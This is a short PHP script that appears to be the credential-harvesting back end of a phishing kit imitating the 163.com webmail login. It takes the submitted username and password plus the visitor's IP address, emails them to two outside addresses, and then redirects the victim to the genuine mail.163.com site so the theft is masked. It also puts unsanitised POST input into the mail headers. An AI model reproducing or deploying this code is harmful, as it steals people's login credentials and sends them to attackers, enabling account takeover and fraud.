<?
$ip = getenv("REMOTE_ADDR");
$message  = "---------------+ 163 +--------------\n";
$message .= "Username : ".$_POST['user']."\n";
$message .= "Password: ".$_POST['pass']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By SDQ-----------------\n";
$send = "mickkykash@yandex.com,krzysztofmjapcz@gmail.com";
$subject = "163 REZULT OGUN OWO [ $ip ]";
$headers = "From: Ali<logs@o2.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: http://mail.163.com/dashi/?from=mail46");

